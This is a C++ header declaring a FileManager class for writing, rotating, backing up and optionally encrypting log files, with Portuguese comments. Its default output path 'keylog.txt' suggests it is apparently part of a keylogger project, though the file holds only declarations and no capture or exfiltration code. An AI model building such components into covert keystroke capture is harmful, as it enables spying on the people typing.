// ============================================================================
// FileManager.h - Gerenciamento de arquivos e logs
// ============================================================================
#ifndef FILEMANAGER_H
#define FILEMANAGER_H

#include <string>
#include <fstream>
#include <vector>
#include <mutex>

class FileManager {
private:
    std::string outputPath;
    std::string backupPath;
    size_t maxFileSize;
    int rotationCount;
    bool encryptionEnabled;
    std::mutex fileMutex;
    
    void rotateFiles();
    void createBackup();
    bool isFileTooLarge();
    std::string getCurrentTimestamp();
    
public:
    FileManager(const std::string& path = "keylog.txt");
    ~FileManager();
    
    bool writeToFile(const std::string& data, bool append = true);
    bool writeWithTimestamp(const std::string& data);
    std::string readFile();
    void clearFile();
    
    void setMaxFileSize(size_t size) { maxFileSize = size; }
    void setEncryption(bool enable) { encryptionEnabled = enable; }
    void setOutputPath(const std::string& path) { outputPath = path; }
    
    bool fileExists() const;
    size_t getFileSize() const;
    std::vector<std::string> getLogHistory() const;
};

#endif